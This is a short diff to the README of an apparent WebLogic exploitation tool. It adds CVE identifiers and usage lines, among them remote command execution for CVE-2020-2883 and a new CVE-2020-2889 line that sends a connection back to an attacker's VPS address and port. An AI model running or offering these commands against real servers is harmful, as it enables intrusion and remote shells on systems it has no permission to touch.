@@ -71,7 +71,17 @@ WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval
 WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval -e 14882
 
 //cve-2020-2883
+//cve-2020-2555
+//cve-2016-0638
+//cve-2016-0315
+//cve-2017-3248
+//cve-2018-2628
+//cve-2018-2893
+//cve-2020-14882
 WeblogicScanner.exe -u 127.0.0.1 -p 7001 -c calc.exe -e 2883
+
+//cve-2020-2889
+WeblogicScanner.exe -u 127.0.0.1 -p 7001 -c -ri <vps_ip> -rp <VPS_PORT> -e 2889
 ```
 
 # 👮免责声明
